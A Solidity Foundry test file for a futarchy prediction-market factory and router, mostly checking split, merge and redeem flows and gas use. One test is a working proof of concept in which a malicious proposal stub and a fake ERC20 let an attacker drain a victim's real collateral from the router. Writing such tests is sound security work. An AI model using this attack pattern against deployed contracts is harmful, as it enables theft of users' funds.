pragma solidity 0.8.20;

import "../src/FutarchyFactory.sol";
import "../src/FutarchyProposal.sol";
import "../src/FutarchyRealityProxy.sol";
import "../src/FutarchyRouter.sol";
import "../src/Market.sol";
import {IMarketFactory, MarketView} from "../src/MarketView.sol";
import "forge-std/Test.sol";
import "solmate/src/utils/LibString.sol";

import "./utils/MaliciousProposal.sol";

import "./utils/MarketConsumer.sol";

import "./utils/FakeERC20.sol";

contract FutarchyFactoryTest is Test {
    uint256 constant MAX_SPLIT_AMOUNT = 100_000_000 ether;

    using LibString for uint256;

    FutarchyFactory futarchyFactory;

    FutarchyRouter futarchyRouter;

    // gnosis addresses
    address internal arbitrator =
        address(0xe40DD83a262da3f56976038F1554Fe541Fa75ecd);
    address internal realitio =
        address(0xE78996A233895bE74a66F451f1019cA9734205cc);
    address internal conditionalTokens =
        address(0xCeAfDD6bc0bEF976fdCd1112955828E00543c0Ce);
    IERC20 internal collateralToken1 =
        IERC20(0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb);
    IERC20 internal collateralToken2 =
        IERC20(0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1);
    address internal wrapped1155Factory =
        address(0xD194319D1804C1051DD21Ba1Dc931cA72410B79f);

    uint256 constant MIN_BOND = 5 ether;

    bytes32 constant INVALID_RESULT =
        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    bytes32 constant ANSWERED_TOO_SOON =
        0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe;
    bytes32 constant PROPOSAL_APPROVED = bytes32(uint256(0));
    bytes32 constant PROPOSAL_REJECTED = bytes32(uint256(1));

    uint8 internal constant OUTCOMES_COUNT = 4;

    function setUp() public {
        uint256 forkId = vm.createFork("https://rpc.gnosischain.com");
        vm.selectFork(forkId);

        FutarchyProposal proposal = new FutarchyProposal();

        FutarchyRealityProxy realityProxy = new FutarchyRealityProxy(
            IConditionalTokens(conditionalTokens),
            IRealityETH_v3_0(realitio)
        );

        futarchyFactory = new FutarchyFactory(
            address(proposal),
            arbitrator,
            IRealityETH_v3_0(realitio),
            IWrapped1155Factory(wrapped1155Factory),
            IConditionalTokens(conditionalTokens),
            realityProxy,
            1.5 days
        );

        futarchyRouter = new FutarchyRouter(
            IConditionalTokens(conditionalTokens),
            IWrapped1155Factory(wrapped1155Factory)
        );
    }

    function getProposal(
        uint256 minBond
    )
        public
        returns (
            //uint256 parentOutcome,
            //address parentProposal
            FutarchyProposal
        )
    {
        FutarchyProposal market = FutarchyProposal(
            futarchyFactory.createProposal(
                FutarchyFactory.CreateProposalParams({
                    marketName: "Will proposal 'Use Seer Futarchy for Governance' be accepted by 2024-12-12 00:00:00?",
                    collateralToken1: collateralToken1,
                    collateralToken2: collateralToken2,
                    //parentOutcome: parentOutcome,
                    //parentMarket: parentProposal,
                    category: "technology",
                    lang: "en_US",
                    minBond: minBond,
                    openingTime: uint32(block.timestamp) + 60
                })
            )
        );

        return market;
    }

    function prepareProposal(
        bytes32 answer,
        uint256 amountSplit1,
        uint256 amountSplit2
    ) public returns (FutarchyProposal proposal) {
        vm.assume(answer != ANSWERED_TOO_SOON);

        proposal = getProposal(MIN_BOND);
        skip(60); // skip opening timestamp

        submitAnswer(proposal.questionId(), answer);

        skip(60 * 60 * 24 * 2); // question timeout

        proposal.resolve();

        vm.startPrank(msg.sender);

        splitMergeAndRedeem(proposal, amountSplit1, amountSplit2);

        vm.stopPrank();

        return proposal;
    }

    function splitMergeAndRedeem(
        FutarchyProposal proposal,
        uint256 amountSplit1,
        uint256 amountSplit2
    ) public {
        IERC20(collateralToken1).approve(address(futarchyRouter), amountSplit1);
        IERC20(collateralToken2).approve(address(futarchyRouter), amountSplit2);

        // split
        if (amountSplit1 > 0) {
            // split collateralToken1
            deal(address(collateralToken1), address(msg.sender), amountSplit1);
            futarchyRouter.splitPosition(
                proposal,
                proposal.collateralToken1(),
                amountSplit1
            );
        }

        if (amountSplit2 > 0) {
            // split collateralToken2
            deal(address(collateralToken2), address(msg.sender), amountSplit2);
            futarchyRouter.splitPosition(
                proposal,
                proposal.collateralToken2(),
                amountSplit2
            );
        }

        // merge half
        uint256 halfAmount1 = amountSplit1 / 2;
        uint256 halfAmount2 = amountSplit2 / 2;
        approveWrappedTokens(
            address(futarchyRouter),
            proposal,
            halfAmount1,
            halfAmount2
        );
        if (amountSplit1 > 0) {
            // merge collateralToken1
            futarchyRouter.mergePositions(
                proposal,
                proposal.collateralToken1(),
                halfAmount1
            );
        }

        if (amountSplit2 > 0) {
            // merge collateralToken2
            futarchyRouter.mergePositions(
                proposal,
                proposal.collateralToken2(),
                halfAmount2
            );
        }

        // redeem half
        approveWrappedTokens(
            address(futarchyRouter),
            proposal,
            halfAmount1,
            halfAmount2
        );

        futarchyRouter.redeemProposal(
            proposal,
            amountSplit1 > 0 ? halfAmount1 : 0,
            amountSplit2 > 0 ? halfAmount2 : 0
        );
    }

    function test_MaliciousProposalStealsCollateral() public {
        // 1) Setup a real market
        FutarchyProposal realProposal = getProposal(MIN_BOND);

        // 2) Deploy fake wrapper & malicious stub
        FakeERC20 fake = new FakeERC20();
        MaliciousProposal stub = new MaliciousProposal(realProposal, fake);

        // 3) Fund router with fake tokens so split will succeed
        uint256 amt = 1 ether;
        fake.mint(address(futarchyRouter), amt * 2);

        // 4) Victim splits using the malicious stub
        address victim = address(0xCAFE);
        deal(address(collateralToken1), victim, amt);
        vm.startPrank(victim);
        collateralToken1.approve(address(futarchyRouter), amt);
        futarchyRouter.splitPosition(
            FutarchyProposal(address(stub)),
            collateralToken1,
            amt
        );
        vm.stopPrank();

        // Router now holds real wrappers: verify
        (IERC20 realWrapper, ) = realProposal.wrappedOutcome(0);
        assertEq(realWrapper.balanceOf(address(futarchyRouter)), amt);

        // 5) Attacker merges to drain collateral
        address attacker = address(this);
        vm.startPrank(attacker);
        fake.mint(attacker, amt * 2);
        fake.approve(address(futarchyRouter), amt * 2);
        futarchyRouter.mergePositions(
            FutarchyProposal(address(stub)),
            collateralToken1,
            amt
        );
        vm.stopPrank();

        // Attacker ends up with the real collateral
        assertEq(collateralToken1.balanceOf(attacker), amt);
        assertEq(collateralToken1.balanceOf(victim), 0);
    }

    function approveWrappedTokens(
        address spender,
        FutarchyProposal proposal,
        uint256 amount1,
        uint256 amount2
    ) public {
        IERC20 wrapped1155;
        (wrapped1155, ) = proposal.wrappedOutcome(0);
        wrapped1155.approve(spender, amount1);
        (wrapped1155, ) = proposal.wrappedOutcome(1);
        wrapped1155.approve(spender, amount1);
        (wrapped1155, ) = proposal.wrappedOutcome(2);
        wrapped1155.approve(spender, amount2);
        (wrapped1155, ) = proposal.wrappedOutcome(3);
        wrapped1155.approve(spender, amount2);
    }

    /// @notice Log `allMarkets()` size call size vs gas used.
    function test_processMarket_gas_growth() public {
        // Simulate the stored length of proposals (slot 0)
        for (uint i = 1; i <100 ; i = i * 2) {
            uint256 len = i;
            vm.store(
                address(futarchyFactory),
                bytes32(uint256(0)), // proposals.length is at storage slot 0
                bytes32(len)
            );
            
            MarketConsumer consumer = new MarketConsumer(
                address(futarchyFactory)
            );

            uint256 gStart = gasleft();
            consumer.process(i-1);
            uint256 gEnd = gasleft();
            uint256 gUsed = gStart - gEnd;
            console.log("allMarkets() size:",i,"gas used:",gUsed);
        }
    }

    /// @notice Compare gas of allMarkets() with simulated proposals vs real proposals, for small N.
    function test_compareGas_simulate_vs_real() public {
        // small sizes to test
        uint256[] memory sizes = new uint256[](3);
        sizes[0] = 1;
        sizes[1] = 5;
        sizes[2] = 10;

        for (uint256 i = 0; i < sizes.length; i++) {
            uint256 N = sizes[i];

            // —— Simulated array length ——
            // overwrite proposals.length = N
            vm.store(
                address(futarchyFactory),
                bytes32(uint256(0)), // slot 0 is proposals.length
                bytes32(N)
            );

            // pre-warm each proposals(i) slot so subsequent sloads are WARM
            for (uint256 j = 0; j < N; j++) {
                // uses the auto-getter; no revert since index < length
                futarchyFactory.proposals(j);
            }

            // measure simulated gas
            uint256 gBefore = gasleft();
            futarchyFactory.allMarkets();
            uint256 hackGas = gBefore - gasleft();

            // reset length back to zero
            vm.store(
                address(futarchyFactory),
                bytes32(uint256(0)),
                bytes32(uint256(0))
            );

            // —— REAL array population ——
            // actually push N proposals via getProposal
            for (uint256 j = 0; j < N; j++) {
                getProposal(MIN_BOND);
            }

            // measure real gas
            uint256 gBefore2 = gasleft();
            futarchyFactory.allMarkets();
            uint256 realGas = gBefore2 - gasleft();

            // clear real proposals for next iteration
            vm.store(
                address(futarchyFactory),
                bytes32(uint256(0)),
                bytes32(uint256(0))
            );

            // log both results
            console.log("hack gas:", hackGas, "real gas:", realGas);
        }
    }

    function assertCollateralBalances(
        address owner,
        IERC20 collateral,
        uint256 amount
    ) public {
        assertEq(collateral.balanceOf(owner), amount);
    }

    function test_AcceptedRedeemsYes1() public {
        prepareProposal(PROPOSAL_APPROVED, 10 ether, 0);

        assertCollateralBalances(msg.sender, collateralToken1, 10 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 0 ether);
    }

    function test_AcceptedRedeemsYes2() public {
        prepareProposal(PROPOSAL_APPROVED, 0, 10 ether);

        assertCollateralBalances(msg.sender, collateralToken1, 0 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 10 ether);
    }

    function test_redeemYes1Yes2() public {
        prepareProposal(PROPOSAL_APPROVED, 10 ether, 10 ether);

        assertCollateralBalances(msg.sender, collateralToken1, 10 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 10 ether);
    }

    function test_RejectedRedeemsNo1() public {
        prepareProposal(PROPOSAL_REJECTED, 10 ether, 0);

        assertCollateralBalances(msg.sender, collateralToken1, 10 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 0 ether);
    }

    function test_RejectedRedeemsNo2() public {
        prepareProposal(PROPOSAL_REJECTED, 0, 10 ether);

        assertCollateralBalances(msg.sender, collateralToken1, 0 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 10 ether);
    }

    function test_RejectedRedeemsNo1No2() public {
        prepareProposal(PROPOSAL_REJECTED, 10 ether, 10 ether);

        assertCollateralBalances(msg.sender, collateralToken1, 10 ether);
        assertCollateralBalances(msg.sender, collateralToken2, 10 ether);
    }

    function submitAnswer(bytes32 questionId, bytes32 answer) public {
        IRealityETH_v3_0(realitio).submitAnswer{value: MIN_BOND}(
            questionId,
            answer,
            0
        );
    }

    function test_marketView() public {
        FutarchyProposal proposal = getProposal(MIN_BOND);

        MarketView marketView = new MarketView();

        MarketView.MarketInfo memory marketInfo = marketView.getMarket(
            IMarketFactory(address(futarchyFactory)),
            Market(address(proposal))
        );
        assertEq(marketInfo.marketName, proposal.marketName());
        assertEq(marketInfo.outcomes.length, 4);
        assertEq(marketInfo.wrappedTokens.length, 4);

        assertEq(
            marketView
                .getMarkets(1, IMarketFactory(address(futarchyFactory)))
                .length,
            1
        );
    }
}
